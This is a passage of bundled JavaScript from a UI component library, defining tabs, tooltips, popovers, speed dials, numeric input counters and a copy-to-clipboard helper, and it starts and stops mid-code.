      console.error("Drawer with id ".concat(drawerId, " not found. Are you sure that the data-drawer-target attribute points to the correct drawer id?"));
    }
  });
}
if (typeof window !== "undefined") {
  window.Drawer = Drawer;
  window.initDrawers = initDrawers;
}
var __assign$6 = function() {
  __assign$6 = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$6.apply(this, arguments);
};
var Default$6 = {
  defaultTabId: null,
  activeClasses: "text-blue-600 hover:text-blue-600 dark:text-blue-500 dark:hover:text-blue-500 border-blue-600 dark:border-blue-500",
  inactiveClasses: "dark:border-transparent text-gray-500 hover:text-gray-600 dark:text-gray-400 border-gray-100 hover:border-gray-300 dark:border-gray-700 dark:hover:text-gray-300",
  onShow: function() {
  }
};
var DefaultInstanceOptions$6 = {
  id: null,
  override: true
};
var Tabs = (
  /** @class */
  function() {
    function Tabs2(tabsEl, items, options, instanceOptions) {
      if (tabsEl === void 0) {
        tabsEl = null;
      }
      if (items === void 0) {
        items = [];
      }
      if (options === void 0) {
        options = Default$6;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$6;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : tabsEl.id;
      this._tabsEl = tabsEl;
      this._items = items;
      this._activeTab = options ? this.getTab(options.defaultTabId) : null;
      this._options = __assign$6(__assign$6({}, Default$6), options);
      this._initialized = false;
      this.init();
      instances.addInstance("Tabs", this, this._instanceId, instanceOptions.override);
    }
    Tabs2.prototype.init = function() {
      var _this = this;
      if (this._items.length && !this._initialized) {
        if (!this._activeTab) {
          this.setActiveTab(this._items[0]);
        }
        this.show(this._activeTab.id, true);
        this._items.map(function(tab) {
          tab.triggerEl.addEventListener("click", function(event) {
            event.preventDefault();
            _this.show(tab.id);
          });
        });
      }
    };
    Tabs2.prototype.destroy = function() {
      if (this._initialized) {
        this._initialized = false;
      }
    };
    Tabs2.prototype.removeInstance = function() {
      this.destroy();
      instances.removeInstance("Tabs", this._instanceId);
    };
    Tabs2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Tabs2.prototype.getActiveTab = function() {
      return this._activeTab;
    };
    Tabs2.prototype.setActiveTab = function(tab) {
      this._activeTab = tab;
    };
    Tabs2.prototype.getTab = function(id) {
      return this._items.filter(function(t) {
        return t.id === id;
      })[0];
    };
    Tabs2.prototype.show = function(id, forceShow) {
      var _a, _b;
      var _this = this;
      if (forceShow === void 0) {
        forceShow = false;
      }
      var tab = this.getTab(id);
      if (tab === this._activeTab && !forceShow) {
        return;
      }
      this._items.map(function(t) {
        var _a2, _b2;
        if (t !== tab) {
          (_a2 = t.triggerEl.classList).remove.apply(_a2, _this._options.activeClasses.split(" "));
          (_b2 = t.triggerEl.classList).add.apply(_b2, _this._options.inactiveClasses.split(" "));
          t.targetEl.classList.add("hidden");
          t.triggerEl.setAttribute("aria-selected", "false");
        }
      });
      (_a = tab.triggerEl.classList).add.apply(_a, this._options.activeClasses.split(" "));
      (_b = tab.triggerEl.classList).remove.apply(_b, this._options.inactiveClasses.split(" "));
      tab.triggerEl.setAttribute("aria-selected", "true");
      tab.targetEl.classList.remove("hidden");
      this.setActiveTab(tab);
      this._options.onShow(this, tab);
    };
    Tabs2.prototype.updateOnShow = function(callback) {
      this._options.onShow = callback;
    };
    return Tabs2;
  }()
);
function initTabs() {
  document.querySelectorAll("[data-tabs-toggle]").forEach(function($parentEl) {
    var tabItems = [];
    var activeClasses = $parentEl.getAttribute("data-tabs-active-classes");
    var inactiveClasses = $parentEl.getAttribute("data-tabs-inactive-classes");
    var defaultTabId = null;
    $parentEl.querySelectorAll('[role="tab"]').forEach(function($triggerEl) {
      var isActive = $triggerEl.getAttribute("aria-selected") === "true";
      var tab = {
        id: $triggerEl.getAttribute("data-tabs-target"),
        triggerEl: $triggerEl,
        targetEl: document.querySelector($triggerEl.getAttribute("data-tabs-target"))
      };
      tabItems.push(tab);
      if (isActive) {
        defaultTabId = tab.id;
      }
    });
    new Tabs($parentEl, tabItems, {
      defaultTabId,
      activeClasses: activeClasses ? activeClasses : Default$6.activeClasses,
      inactiveClasses: inactiveClasses ? inactiveClasses : Default$6.inactiveClasses
    });
  });
}
if (typeof window !== "undefined") {
  window.Tabs = Tabs;
  window.initTabs = initTabs;
}
var __assign$5 = function() {
  __assign$5 = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$5.apply(this, arguments);
};
var __spreadArray$1 = function(to, from, pack) {
  if (pack || arguments.length === 2) for (var i2 = 0, l2 = from.length, ar; i2 < l2; i2++) {
    if (ar || !(i2 in from)) {
      if (!ar) ar = Array.prototype.slice.call(from, 0, i2);
      ar[i2] = from[i2];
    }
  }
  return to.concat(ar || Array.prototype.slice.call(from));
};
var Default$5 = {
  placement: "top",
  triggerType: "hover",
  onShow: function() {
  },
  onHide: function() {
  },
  onToggle: function() {
  }
};
var DefaultInstanceOptions$5 = {
  id: null,
  override: true
};
var Tooltip$1 = (
  /** @class */
  function() {
    function Tooltip2(targetEl, triggerEl, options, instanceOptions) {
      if (targetEl === void 0) {
        targetEl = null;
      }
      if (triggerEl === void 0) {
        triggerEl = null;
      }
      if (options === void 0) {
        options = Default$5;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$5;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
      this._targetEl = targetEl;
      this._triggerEl = triggerEl;
      this._options = __assign$5(__assign$5({}, Default$5), options);
      this._popperInstance = null;
      this._visible = false;
      this._initialized = false;
      this.init();
      instances.addInstance("Tooltip", this, this._instanceId, instanceOptions.override);
    }
    Tooltip2.prototype.init = function() {
      if (this._triggerEl && this._targetEl && !this._initialized) {
        this._setupEventListeners();
        this._popperInstance = this._createPopperInstance();
        this._initialized = true;
      }
    };
    Tooltip2.prototype.destroy = function() {
      var _this = this;
      if (this._initialized) {
        var triggerEvents = this._getTriggerEvents();
        triggerEvents.showEvents.forEach(function(ev) {
          _this._triggerEl.removeEventListener(ev, _this._showHandler);
        });
        triggerEvents.hideEvents.forEach(function(ev) {
          _this._triggerEl.removeEventListener(ev, _this._hideHandler);
        });
        this._removeKeydownListener();
        this._removeClickOutsideListener();
        if (this._popperInstance) {
          this._popperInstance.destroy();
        }
        this._initialized = false;
      }
    };
    Tooltip2.prototype.removeInstance = function() {
      instances.removeInstance("Tooltip", this._instanceId);
    };
    Tooltip2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Tooltip2.prototype._setupEventListeners = function() {
      var _this = this;
      var triggerEvents = this._getTriggerEvents();
      this._showHandler = function() {
        _this.show();
      };
      this._hideHandler = function() {
        _this.hide();
      };
      triggerEvents.showEvents.forEach(function(ev) {
        _this._triggerEl.addEventListener(ev, _this._showHandler);
      });
      triggerEvents.hideEvents.forEach(function(ev) {
        _this._triggerEl.addEventListener(ev, _this._hideHandler);
      });
    };
    Tooltip2.prototype._createPopperInstance = function() {
      return createPopper(this._triggerEl, this._targetEl, {
        placement: this._options.placement,
        modifiers: [
          {
            name: "offset",
            options: {
              offset: [0, 8]
            }
          }
        ]
      });
    };
    Tooltip2.prototype._getTriggerEvents = function() {
      switch (this._options.triggerType) {
        case "hover":
          return {
            showEvents: ["mouseenter", "focus"],
            hideEvents: ["mouseleave", "blur"]
          };
        case "click":
          return {
            showEvents: ["click", "focus"],
            hideEvents: ["focusout", "blur"]
          };
        case "none":
          return {
            showEvents: [],
            hideEvents: []
          };
        default:
          return {
            showEvents: ["mouseenter", "focus"],
            hideEvents: ["mouseleave", "blur"]
          };
      }
    };
    Tooltip2.prototype._setupKeydownListener = function() {
      var _this = this;
      this._keydownEventListener = function(ev) {
        if (ev.key === "Escape") {
          _this.hide();
        }
      };
      document.body.addEventListener("keydown", this._keydownEventListener, true);
    };
    Tooltip2.prototype._removeKeydownListener = function() {
      document.body.removeEventListener("keydown", this._keydownEventListener, true);
    };
    Tooltip2.prototype._setupClickOutsideListener = function() {
      var _this = this;
      this._clickOutsideEventListener = function(ev) {
        _this._handleClickOutside(ev, _this._targetEl);
      };
      document.body.addEventListener("click", this._clickOutsideEventListener, true);
    };
    Tooltip2.prototype._removeClickOutsideListener = function() {
      document.body.removeEventListener("click", this._clickOutsideEventListener, true);
    };
    Tooltip2.prototype._handleClickOutside = function(ev, targetEl) {
      var clickedEl = ev.target;
      if (clickedEl !== targetEl && !targetEl.contains(clickedEl) && !this._triggerEl.contains(clickedEl) && this.isVisible()) {
        this.hide();
      }
    };
    Tooltip2.prototype.isVisible = function() {
      return this._visible;
    };
    Tooltip2.prototype.toggle = function() {
      if (this.isVisible()) {
        this.hide();
      } else {
        this.show();
      }
    };
    Tooltip2.prototype.show = function() {
      this._targetEl.classList.remove("opacity-0", "invisible");
      this._targetEl.classList.add("opacity-100", "visible");
      this._popperInstance.setOptions(function(options) {
        return __assign$5(__assign$5({}, options), { modifiers: __spreadArray$1(__spreadArray$1([], options.modifiers, true), [
          { name: "eventListeners", enabled: true }
        ], false) });
      });
      this._setupClickOutsideListener();
      this._setupKeydownListener();
      this._popperInstance.update();
      this._visible = true;
      this._options.onShow(this);
    };
    Tooltip2.prototype.hide = function() {
      this._targetEl.classList.remove("opacity-100", "visible");
      this._targetEl.classList.add("opacity-0", "invisible");
      this._popperInstance.setOptions(function(options) {
        return __assign$5(__assign$5({}, options), { modifiers: __spreadArray$1(__spreadArray$1([], options.modifiers, true), [
          { name: "eventListeners", enabled: false }
        ], false) });
      });
      this._removeClickOutsideListener();
      this._removeKeydownListener();
      this._visible = false;
      this._options.onHide(this);
    };
    Tooltip2.prototype.updateOnShow = function(callback) {
      this._options.onShow = callback;
    };
    Tooltip2.prototype.updateOnHide = function(callback) {
      this._options.onHide = callback;
    };
    Tooltip2.prototype.updateOnToggle = function(callback) {
      this._options.onToggle = callback;
    };
    return Tooltip2;
  }()
);
function initTooltips() {
  document.querySelectorAll("[data-tooltip-target]").forEach(function($triggerEl) {
    var tooltipId = $triggerEl.getAttribute("data-tooltip-target");
    var $tooltipEl = document.getElementById(tooltipId);
    if ($tooltipEl) {
      var triggerType = $triggerEl.getAttribute("data-tooltip-trigger");
      var placement = $triggerEl.getAttribute("data-tooltip-placement");
      new Tooltip$1($tooltipEl, $triggerEl, {
        placement: placement ? placement : Default$5.placement,
        triggerType: triggerType ? triggerType : Default$5.triggerType
      });
    } else {
      console.error('The tooltip element with id "'.concat(tooltipId, '" does not exist. Please check the data-tooltip-target attribute.'));
    }
  });
}
if (typeof window !== "undefined") {
  window.Tooltip = Tooltip$1;
  window.initTooltips = initTooltips;
}
var __assign$4 = function() {
  __assign$4 = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$4.apply(this, arguments);
};
var __spreadArray = function(to, from, pack) {
  if (pack || arguments.length === 2) for (var i2 = 0, l2 = from.length, ar; i2 < l2; i2++) {
    if (ar || !(i2 in from)) {
      if (!ar) ar = Array.prototype.slice.call(from, 0, i2);
      ar[i2] = from[i2];
    }
  }
  return to.concat(ar || Array.prototype.slice.call(from));
};
var Default$4 = {
  placement: "top",
  offset: 10,
  triggerType: "hover",
  onShow: function() {
  },
  onHide: function() {
  },
  onToggle: function() {
  }
};
var DefaultInstanceOptions$4 = {
  id: null,
  override: true
};
var Popover = (
  /** @class */
  function() {
    function Popover2(targetEl, triggerEl, options, instanceOptions) {
      if (targetEl === void 0) {
        targetEl = null;
      }
      if (triggerEl === void 0) {
        triggerEl = null;
      }
      if (options === void 0) {
        options = Default$4;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$4;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
      this._targetEl = targetEl;
      this._triggerEl = triggerEl;
      this._options = __assign$4(__assign$4({}, Default$4), options);
      this._popperInstance = null;
      this._visible = false;
      this._initialized = false;
      this.init();
      instances.addInstance("Popover", this, instanceOptions.id ? instanceOptions.id : this._targetEl.id, instanceOptions.override);
    }
    Popover2.prototype.init = function() {
      if (this._triggerEl && this._targetEl && !this._initialized) {
        this._setupEventListeners();
        this._popperInstance = this._createPopperInstance();
        this._initialized = true;
      }
    };
    Popover2.prototype.destroy = function() {
      var _this = this;
      if (this._initialized) {
        var triggerEvents = this._getTriggerEvents();
        triggerEvents.showEvents.forEach(function(ev) {
          _this._triggerEl.removeEventListener(ev, _this._showHandler);
          _this._targetEl.removeEventListener(ev, _this._showHandler);
        });
        triggerEvents.hideEvents.forEach(function(ev) {
          _this._triggerEl.removeEventListener(ev, _this._hideHandler);
          _this._targetEl.removeEventListener(ev, _this._hideHandler);
        });
        this._removeKeydownListener();
        this._removeClickOutsideListener();
        if (this._popperInstance) {
          this._popperInstance.destroy();
        }
        this._initialized = false;
      }
    };
    Popover2.prototype.removeInstance = function() {
      instances.removeInstance("Popover", this._instanceId);
    };
    Popover2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Popover2.prototype._setupEventListeners = function() {
      var _this = this;
      var triggerEvents = this._getTriggerEvents();
      this._showHandler = function() {
        _this.show();
      };
      this._hideHandler = function() {
        setTimeout(function() {
          if (!_this._targetEl.matches(":hover")) {
            _this.hide();
          }
        }, 100);
      };
      triggerEvents.showEvents.forEach(function(ev) {
        _this._triggerEl.addEventListener(ev, _this._showHandler);
        _this._targetEl.addEventListener(ev, _this._showHandler);
      });
      triggerEvents.hideEvents.forEach(function(ev) {
        _this._triggerEl.addEventListener(ev, _this._hideHandler);
        _this._targetEl.addEventListener(ev, _this._hideHandler);
      });
    };
    Popover2.prototype._createPopperInstance = function() {
      return createPopper(this._triggerEl, this._targetEl, {
        placement: this._options.placement,
        modifiers: [
          {
            name: "offset",
            options: {
              offset: [0, this._options.offset]
            }
          }
        ]
      });
    };
    Popover2.prototype._getTriggerEvents = function() {
      switch (this._options.triggerType) {
        case "hover":
          return {
            showEvents: ["mouseenter", "focus"],
            hideEvents: ["mouseleave", "blur"]
          };
        case "click":
          return {
            showEvents: ["click", "focus"],
            hideEvents: ["focusout", "blur"]
          };
        case "none":
          return {
            showEvents: [],
            hideEvents: []
          };
        default:
          return {
            showEvents: ["mouseenter", "focus"],
            hideEvents: ["mouseleave", "blur"]
          };
      }
    };
    Popover2.prototype._setupKeydownListener = function() {
      var _this = this;
      this._keydownEventListener = function(ev) {
        if (ev.key === "Escape") {
          _this.hide();
        }
      };
      document.body.addEventListener("keydown", this._keydownEventListener, true);
    };
    Popover2.prototype._removeKeydownListener = function() {
      document.body.removeEventListener("keydown", this._keydownEventListener, true);
    };
    Popover2.prototype._setupClickOutsideListener = function() {
      var _this = this;
      this._clickOutsideEventListener = function(ev) {
        _this._handleClickOutside(ev, _this._targetEl);
      };
      document.body.addEventListener("click", this._clickOutsideEventListener, true);
    };
    Popover2.prototype._removeClickOutsideListener = function() {
      document.body.removeEventListener("click", this._clickOutsideEventListener, true);
    };
    Popover2.prototype._handleClickOutside = function(ev, targetEl) {
      var clickedEl = ev.target;
      if (clickedEl !== targetEl && !targetEl.contains(clickedEl) && !this._triggerEl.contains(clickedEl) && this.isVisible()) {
        this.hide();
      }
    };
    Popover2.prototype.isVisible = function() {
      return this._visible;
    };
    Popover2.prototype.toggle = function() {
      if (this.isVisible()) {
        this.hide();
      } else {
        this.show();
      }
      this._options.onToggle(this);
    };
    Popover2.prototype.show = function() {
      this._targetEl.classList.remove("opacity-0", "invisible");
      this._targetEl.classList.add("opacity-100", "visible");
      this._popperInstance.setOptions(function(options) {
        return __assign$4(__assign$4({}, options), { modifiers: __spreadArray(__spreadArray([], options.modifiers, true), [
          { name: "eventListeners", enabled: true }
        ], false) });
      });
      this._setupClickOutsideListener();
      this._setupKeydownListener();
      this._popperInstance.update();
      this._visible = true;
      this._options.onShow(this);
    };
    Popover2.prototype.hide = function() {
      this._targetEl.classList.remove("opacity-100", "visible");
      this._targetEl.classList.add("opacity-0", "invisible");
      this._popperInstance.setOptions(function(options) {
        return __assign$4(__assign$4({}, options), { modifiers: __spreadArray(__spreadArray([], options.modifiers, true), [
          { name: "eventListeners", enabled: false }
        ], false) });
      });
      this._removeClickOutsideListener();
      this._removeKeydownListener();
      this._visible = false;
      this._options.onHide(this);
    };
    Popover2.prototype.updateOnShow = function(callback) {
      this._options.onShow = callback;
    };
    Popover2.prototype.updateOnHide = function(callback) {
      this._options.onHide = callback;
    };
    Popover2.prototype.updateOnToggle = function(callback) {
      this._options.onToggle = callback;
    };
    return Popover2;
  }()
);
function initPopovers() {
  document.querySelectorAll("[data-popover-target]").forEach(function($triggerEl) {
    var popoverID = $triggerEl.getAttribute("data-popover-target");
    var $popoverEl = document.getElementById(popoverID);
    if ($popoverEl) {
      var triggerType = $triggerEl.getAttribute("data-popover-trigger");
      var placement = $triggerEl.getAttribute("data-popover-placement");
      var offset2 = $triggerEl.getAttribute("data-popover-offset");
      new Popover($popoverEl, $triggerEl, {
        placement: placement ? placement : Default$4.placement,
        offset: offset2 ? parseInt(offset2) : Default$4.offset,
        triggerType: triggerType ? triggerType : Default$4.triggerType
      });
    } else {
      console.error('The popover element with id "'.concat(popoverID, '" does not exist. Please check the data-popover-target attribute.'));
    }
  });
}
if (typeof window !== "undefined") {
  window.Popover = Popover;
  window.initPopovers = initPopovers;
}
var __assign$3 = function() {
  __assign$3 = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$3.apply(this, arguments);
};
var Default$3 = {
  triggerType: "hover",
  onShow: function() {
  },
  onHide: function() {
  },
  onToggle: function() {
  }
};
var DefaultInstanceOptions$3 = {
  id: null,
  override: true
};
var Dial = (
  /** @class */
  function() {
    function Dial2(parentEl, triggerEl, targetEl, options, instanceOptions) {
      if (parentEl === void 0) {
        parentEl = null;
      }
      if (triggerEl === void 0) {
        triggerEl = null;
      }
      if (targetEl === void 0) {
        targetEl = null;
      }
      if (options === void 0) {
        options = Default$3;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$3;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
      this._parentEl = parentEl;
      this._triggerEl = triggerEl;
      this._targetEl = targetEl;
      this._options = __assign$3(__assign$3({}, Default$3), options);
      this._visible = false;
      this._initialized = false;
      this.init();
      instances.addInstance("Dial", this, this._instanceId, instanceOptions.override);
    }
    Dial2.prototype.init = function() {
      var _this = this;
      if (this._triggerEl && this._targetEl && !this._initialized) {
        var triggerEventTypes = this._getTriggerEventTypes(this._options.triggerType);
        this._showEventHandler = function() {
          _this.show();
        };
        triggerEventTypes.showEvents.forEach(function(ev) {
          _this._triggerEl.addEventListener(ev, _this._showEventHandler);
          _this._targetEl.addEventListener(ev, _this._showEventHandler);
        });
        this._hideEventHandler = function() {
          if (!_this._parentEl.matches(":hover")) {
            _this.hide();
          }
        };
        triggerEventTypes.hideEvents.forEach(function(ev) {
          _this._parentEl.addEventListener(ev, _this._hideEventHandler);
        });
        this._initialized = true;
      }
    };
    Dial2.prototype.destroy = function() {
      var _this = this;
      if (this._initialized) {
        var triggerEventTypes = this._getTriggerEventTypes(this._options.triggerType);
        triggerEventTypes.showEvents.forEach(function(ev) {
          _this._triggerEl.removeEventListener(ev, _this._showEventHandler);
          _this._targetEl.removeEventListener(ev, _this._showEventHandler);
        });
        triggerEventTypes.hideEvents.forEach(function(ev) {
          _this._parentEl.removeEventListener(ev, _this._hideEventHandler);
        });
        this._initialized = false;
      }
    };
    Dial2.prototype.removeInstance = function() {
      instances.removeInstance("Dial", this._instanceId);
    };
    Dial2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    Dial2.prototype.hide = function() {
      this._targetEl.classList.add("hidden");
      if (this._triggerEl) {
        this._triggerEl.setAttribute("aria-expanded", "false");
      }
      this._visible = false;
      this._options.onHide(this);
    };
    Dial2.prototype.show = function() {
      this._targetEl.classList.remove("hidden");
      if (this._triggerEl) {
        this._triggerEl.setAttribute("aria-expanded", "true");
      }
      this._visible = true;
      this._options.onShow(this);
    };
    Dial2.prototype.toggle = function() {
      if (this._visible) {
        this.hide();
      } else {
        this.show();
      }
    };
    Dial2.prototype.isHidden = function() {
      return !this._visible;
    };
    Dial2.prototype.isVisible = function() {
      return this._visible;
    };
    Dial2.prototype._getTriggerEventTypes = function(triggerType) {
      switch (triggerType) {
        case "hover":
          return {
            showEvents: ["mouseenter", "focus"],
            hideEvents: ["mouseleave", "blur"]
          };
        case "click":
          return {
            showEvents: ["click", "focus"],
            hideEvents: ["focusout", "blur"]
          };
        case "none":
          return {
            showEvents: [],
            hideEvents: []
          };
        default:
          return {
            showEvents: ["mouseenter", "focus"],
            hideEvents: ["mouseleave", "blur"]
          };
      }
    };
    Dial2.prototype.updateOnShow = function(callback) {
      this._options.onShow = callback;
    };
    Dial2.prototype.updateOnHide = function(callback) {
      this._options.onHide = callback;
    };
    Dial2.prototype.updateOnToggle = function(callback) {
      this._options.onToggle = callback;
    };
    return Dial2;
  }()
);
function initDials() {
  document.querySelectorAll("[data-dial-init]").forEach(function($parentEl) {
    var $triggerEl = $parentEl.querySelector("[data-dial-toggle]");
    if ($triggerEl) {
      var dialId = $triggerEl.getAttribute("data-dial-toggle");
      var $dialEl = document.getElementById(dialId);
      if ($dialEl) {
        var triggerType = $triggerEl.getAttribute("data-dial-trigger");
        new Dial($parentEl, $triggerEl, $dialEl, {
          triggerType: triggerType ? triggerType : Default$3.triggerType
        });
      } else {
        console.error("Dial with id ".concat(dialId, " does not exist. Are you sure that the data-dial-toggle attribute points to the correct modal id?"));
      }
    } else {
      console.error("Dial with id ".concat($parentEl.id, " does not have a trigger element. Are you sure that the data-dial-toggle attribute exists?"));
    }
  });
}
if (typeof window !== "undefined") {
  window.Dial = Dial;
  window.initDials = initDials;
}
var __assign$2 = function() {
  __assign$2 = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$2.apply(this, arguments);
};
var Default$2 = {
  minValue: null,
  maxValue: null,
  onIncrement: function() {
  },
  onDecrement: function() {
  }
};
var DefaultInstanceOptions$2 = {
  id: null,
  override: true
};
var InputCounter = (
  /** @class */
  function() {
    function InputCounter2(targetEl, incrementEl, decrementEl, options, instanceOptions) {
      if (targetEl === void 0) {
        targetEl = null;
      }
      if (incrementEl === void 0) {
        incrementEl = null;
      }
      if (decrementEl === void 0) {
        decrementEl = null;
      }
      if (options === void 0) {
        options = Default$2;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$2;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
      this._targetEl = targetEl;
      this._incrementEl = incrementEl;
      this._decrementEl = decrementEl;
      this._options = __assign$2(__assign$2({}, Default$2), options);
      this._initialized = false;
      this.init();
      instances.addInstance("InputCounter", this, this._instanceId, instanceOptions.override);
    }
    InputCounter2.prototype.init = function() {
      var _this = this;
      if (this._targetEl && !this._initialized) {
        this._inputHandler = function(event) {
          {
            var target = event.target;
            if (!/^\d*$/.test(target.value)) {
              target.value = target.value.replace(/[^\d]/g, "");
            }
            if (_this._options.maxValue !== null && parseInt(target.value) > _this._options.maxValue) {
              target.value = _this._options.maxValue.toString();
            }
            if (_this._options.minValue !== null && parseInt(target.value) < _this._options.minValue) {
              target.value = _this._options.minValue.toString();
            }
          }
        };
        this._incrementClickHandler = function() {
          _this.increment();
        };
        this._decrementClickHandler = function() {
          _this.decrement();
        };
        this._targetEl.addEventListener("input", this._inputHandler);
        if (this._incrementEl) {
          this._incrementEl.addEventListener("click", this._incrementClickHandler);
        }
        if (this._decrementEl) {
          this._decrementEl.addEventListener("click", this._decrementClickHandler);
        }
        this._initialized = true;
      }
    };
    InputCounter2.prototype.destroy = function() {
      if (this._targetEl && this._initialized) {
        this._targetEl.removeEventListener("input", this._inputHandler);
        if (this._incrementEl) {
          this._incrementEl.removeEventListener("click", this._incrementClickHandler);
        }
        if (this._decrementEl) {
          this._decrementEl.removeEventListener("click", this._decrementClickHandler);
        }
        this._initialized = false;
      }
    };
    InputCounter2.prototype.removeInstance = function() {
      instances.removeInstance("InputCounter", this._instanceId);
    };
    InputCounter2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    InputCounter2.prototype.getCurrentValue = function() {
      return parseInt(this._targetEl.value) || 0;
    };
    InputCounter2.prototype.increment = function() {
      if (this._options.maxValue !== null && this.getCurrentValue() >= this._options.maxValue) {
        return;
      }
      this._targetEl.value = (this.getCurrentValue() + 1).toString();
      this._options.onIncrement(this);
    };
    InputCounter2.prototype.decrement = function() {
      if (this._options.minValue !== null && this.getCurrentValue() <= this._options.minValue) {
        return;
      }
      this._targetEl.value = (this.getCurrentValue() - 1).toString();
      this._options.onDecrement(this);
    };
    InputCounter2.prototype.updateOnIncrement = function(callback) {
      this._options.onIncrement = callback;
    };
    InputCounter2.prototype.updateOnDecrement = function(callback) {
      this._options.onDecrement = callback;
    };
    return InputCounter2;
  }()
);
function initInputCounters() {
  document.querySelectorAll("[data-input-counter]").forEach(function($targetEl) {
    var targetId = $targetEl.id;
    var $incrementEl = document.querySelector('[data-input-counter-increment="' + targetId + '"]');
    var $decrementEl = document.querySelector('[data-input-counter-decrement="' + targetId + '"]');
    var minValue = $targetEl.getAttribute("data-input-counter-min");
    var maxValue = $targetEl.getAttribute("data-input-counter-max");
    if ($targetEl) {
      if (!instances.instanceExists("InputCounter", $targetEl.getAttribute("id"))) {
        new InputCounter($targetEl, $incrementEl ? $incrementEl : null, $decrementEl ? $decrementEl : null, {
          minValue: minValue ? parseInt(minValue) : null,
          maxValue: maxValue ? parseInt(maxValue) : null
        });
      }
    } else {
      console.error('The target element with id "'.concat(targetId, '" does not exist. Please check the data-input-counter attribute.'));
    }
  });
}
if (typeof window !== "undefined") {
  window.InputCounter = InputCounter;
  window.initInputCounters = initInputCounters;
}
var __assign$1 = function() {
  __assign$1 = Object.assign || function(t) {
    for (var s2, i2 = 1, n2 = arguments.length; i2 < n2; i2++) {
      s2 = arguments[i2];
      for (var p in s2) if (Object.prototype.hasOwnProperty.call(s2, p))
        t[p] = s2[p];
    }
    return t;
  };
  return __assign$1.apply(this, arguments);
};
var Default$1 = {
  htmlEntities: false,
  contentType: "input",
  onCopy: function() {
  }
};
var DefaultInstanceOptions$1 = {
  id: null,
  override: true
};
var CopyClipboard = (
  /** @class */
  function() {
    function CopyClipboard2(triggerEl, targetEl, options, instanceOptions) {
      if (triggerEl === void 0) {
        triggerEl = null;
      }
      if (targetEl === void 0) {
        targetEl = null;
      }
      if (options === void 0) {
        options = Default$1;
      }
      if (instanceOptions === void 0) {
        instanceOptions = DefaultInstanceOptions$1;
      }
      this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
      this._triggerEl = triggerEl;
      this._targetEl = targetEl;
      this._options = __assign$1(__assign$1({}, Default$1), options);
      this._initialized = false;
      this.init();
      instances.addInstance("CopyClipboard", this, this._instanceId, instanceOptions.override);
    }
    CopyClipboard2.prototype.init = function() {
      var _this = this;
      if (this._targetEl && this._triggerEl && !this._initialized) {
        this._triggerElClickHandler = function() {
          _this.copy();
        };
        if (this._triggerEl) {
          this._triggerEl.addEventListener("click", this._triggerElClickHandler);
        }
        this._initialized = true;
      }
    };
    CopyClipboard2.prototype.destroy = function() {
      if (this._triggerEl && this._targetEl && this._initialized) {
        if (this._triggerEl) {
          this._triggerEl.removeEventListener("click", this._triggerElClickHandler);
        }
        this._initialized = false;
      }
    };
    CopyClipboard2.prototype.removeInstance = function() {
      instances.removeInstance("CopyClipboard", this._instanceId);
    };
    CopyClipboard2.prototype.destroyAndRemoveInstance = function() {
      this.destroy();
      this.removeInstance();
    };
    CopyClipboard2.prototype.getTargetValue = function() {
      if (this._options.contentType === "input") {
        return this._targetEl.value;
      }
      if (this._options.contentType === "innerHTML") {
        return this._targetEl.innerHTML;
      }
      if (this._options.contentType === "textContent") {
        return this._targetEl.textContent.replace(/\s+/g, " ").trim();
      }
    };
    CopyClipboard2.prototype.copy = function() {
      var textToCopy = this.getTargetValue();
      if (this._options.htmlEntities) {
        textToCopy = this.decodeHTML(textToCopy);
      }
      var tempTextArea = document.createElement("textarea");
      tempTextArea.value = textToCopy;
      document.body.appendChild(tempTextArea);
      tempTextArea.select();
      document.execCommand("copy");
      document.body.removeChild(tempTextArea);
      this._options.onCopy(this);
      return textToCopy;
    };
    CopyClipboard2.prototype.decodeHTML = function(html2) {
      var textarea2 = document.createElement("textarea");
      textarea2.innerHTML = html2;
      return textarea2.textContent;
    };
    CopyClipboard2.prototype.updateOnCopyCallback = function(callback) {
      this._options.onCopy = callback;
    };
    return CopyClipboard2;
  }()
);
function initCopyClipboards() {
  document.querySelectorAll("[data-copy-to-clipboard-target]").forEach(function($triggerEl) {
    var targetId = $triggerEl.getAttribute("data-copy-to-clipboard-target");
    var $targetEl = document.getElementById(targetId);
